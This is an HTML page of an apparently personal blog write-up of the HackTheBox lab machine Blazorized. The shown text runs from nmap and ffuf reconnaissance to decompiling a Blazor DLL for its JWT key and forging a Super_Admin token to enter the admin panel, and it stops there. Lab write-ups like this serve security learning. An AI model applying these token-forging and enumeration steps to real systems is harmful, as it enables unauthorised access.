@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/11/08/hackthebox-blazorized/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewBlazorized is a Hard-difficulty windows HackTheBox machine dealing initially with subdomain enumeration and DLL decompiling to be able to forge our own JWT token and get into the admin panel w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Blazorized">
+<meta property="og:url" content="http://foued-saidi.tech/2024/11/08/Hackthebox-Blazorized/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewBlazorized is a Hard-difficulty windows HackTheBox machine dealing initially with subdomain enumeration and DLL decompiling to be able to forge our own JWT token and get into the admin panel w">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/Blazorized.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/web1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/web2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/dll.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/admin.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/cookie.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/cookie1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/cookie2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/admin1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/sqli.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/bloodhound.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/password.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/dcsync.png">
+<meta property="article:published_time" content="2024-11-08T19:09:27.000Z">
+<meta property="article:modified_time" content="2024-11-11T00:30:45.980Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Blazorized/Blazorized.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Blazorized -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Blazorized</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-08 20:09:27</span>
+        <span class="mobile">2024-11-08 20:09:27</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-11 01:30:45</span>
+            <span class="mobile">2024-11-11 01:30:45</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Blazorized is a Hard-difficulty windows HackTheBox machine dealing initially with subdomain enumeration and DLL decompiling to be able to forge our own JWT token and get into the admin panel where we’ll be abusing an sql injection over MSSQL and get a shell. Later performing a mix of different attacks to acquire different users: from Kerberoasting to script path setting and abuse to DCSync and getting system. It was a really fun box.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/Blazorized.png"
+                      alt="Blazorized-info-card"
+                ><figcaption>Blazorized-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">23.80</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-10</span> <span class="number">21</span>:<span class="number">55</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">23.80</span></span><br><span class="line">Host is up (<span class="number">0.30</span>s latency).</span><br><span class="line">Not shown: <span class="number">986</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">80</span>/tcp   open  http          Microsoft IIS httpd <span class="number">10.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://blazorized.htb</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-IIS</span>/<span class="number">10.0</span></span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-11-10</span> <span class="number">21</span>:<span class="number">01</span>:<span class="number">09</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">1433</span>/tcp open  ms<span class="literal">-sql-s</span>      Microsoft SQL Server <span class="number">2022</span></span><br><span class="line">|_ms<span class="literal">-sql-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line">|_ms<span class="literal">-sql-ntlm-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-11-10T20</span>:<span class="number">59</span>:<span class="number">17</span></span><br><span class="line">|_Not valid after:  <span class="number">2054</span><span class="literal">-11-10T20</span>:<span class="number">59</span>:<span class="number">17</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-11-10T21</span>:<span class="number">01</span>:<span class="number">59</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">5</span>m00s from scanner time.</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp open  tcpwrapped</span><br><span class="line"><span class="number">5985</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-11-10T21</span>:<span class="number">01</span>:<span class="number">31</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: mean: <span class="number">4</span>m59s, deviation: <span class="number">0</span>s, median: <span class="number">4</span>m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">93.48</span> seconds</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>We can see that we have a web application running on port 80 that’s redirecting us to <code>blazorized.htb</code>, let’s add that entry to our <code>/etc/hosts</code> file and check what we have ;)</p>
+<h4 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h4><p>We perform some subdomain enumeration on the main domain and we find something interesting:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools\ffuf_2.<span class="number">0.0</span>_windows_amd64&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.blazorized.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.23.80&quot;</span> <span class="literal">-fs</span> <span class="number">144</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.23.80</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Desktop\Tools\SecLists-master\SecLists-master\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.blazorized.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 144</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2072, Words: 149, Lines: 28, Duration: 327ms]0:00:00] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: admin</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We go ahead and add <code>admin.blazoried.htb</code> to our <code>/etc/hosts</code> file.</p>
+<h3 id="Web-Application-http-blazoried-htb"><a href="#Web-Application-http-blazoried-htb" class="headerlink" title="Web Application - http://blazoried.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://blazoried.htb/" >http://blazoried.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/web1.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>This site is a personal Digital Garden, and the “Built with Blazor WebAssembly” is really interesting as it will come in handy later.<br>(I found an XSS vulnerability under the <a class="link"   target="_blank" rel="noopener" href="http://blazorized.htb/markdown" >http://blazorized.htb/markdown <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> endpoint but turned out to be a rabbit hole :’(  )</p>
+<p>Checking <a class="link"   target="_blank" rel="noopener" href="https://caido.io/" >Caido <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> while inspecting our application shows us that there are a lot of DLLs being loaded into the app:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/web2.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>But navigation to the <code>/check-updates</code> endpoint, we see a new DLL being loaded. This shows that the app implements Lazy Loading and providing resources as the user needs them not loading everything all at once (this is what I understood from the docs of the frmaework):<br>However, navigating to this endpoint we get <code>However, you can use the button below to impersonate (temporarily, and securely) the admin and fetch all post and category updates.</code><br>So I just thought this <code>/_framework/Blazorized.Helpers.dll</code> DLL would be interesting, so let’s download it and open it with <a class="link"   target="_blank" rel="noopener" href="https://www.jetbrains.com/decompiler/download/" >Dotpeek <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/dll.png"
+                      alt="Helpers DLL Inspection "
+                ><figcaption>Helpers DLL Inspection </figcaption></figure></p>
+<p>We can see that one of the Helpers detailed is the implementation of the JWT policy for the application, where we have the <code>Security Key</code> and mention about the admin dashboard we found out later. I think it’s about time we go ahead and explore it ;)</p>
+<h3 id="Web-Application-http-admin-blazoried-htb"><a href="#Web-Application-http-admin-blazoried-htb" class="headerlink" title="Web Application - http://admin.blazoried.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://admin.blazoried.htb/" >http://admin.blazoried.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/admin.png"
+                      alt="Admin Dashboard "
+                ><figcaption>Admin Dashboard </figcaption></figure></p>
+<p>It looks like a simple admin dashboard with a login feature, but I could not find a cookie anywhere to exploit the JWT settings we got earlier.<br>But an idea I just got, since we know that the app is implementing lazy loading, I’ll check other endpoints from the main domain and see if I get something interesting. And we do get a response from the API with a model for the JWT token:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/cookie.png"
+                      alt="Admin Dashboard "
+                ><figcaption>Admin Dashboard </figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/cookie1.png"
+                      alt="Admin Dashboard "
+                ><figcaption>Admin Dashboard </figcaption></figure></p>
+<p>We can see that the roles we have withing that cookie are only “Posts_Get_All” and “Categories_Get_All”. But checking from the DLL we decompiled, we can see that we have a <code>superAdminRoleClaimValue = &quot;Super_Admin&quot;</code> role and that the used algorithm is “HS512”<br>So we should update our cookie with that role, update the audience to “<a class="link"   target="_blank" rel="noopener" href="http://admin.blazorized.htb/" >http://admin.blazorized.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“. Let’s see:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/cookie2.png"
+                      alt="Admin Dashboard "
+                ><figcaption>Admin Dashboard </figcaption></figure></p>
+<p>And test it out on our admin dashboard:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/admin1.png"
+                      alt="Admin Dashboard "
+                ><figcaption>Admin Dashboard </figcaption></figure><br>And we are in!</p>
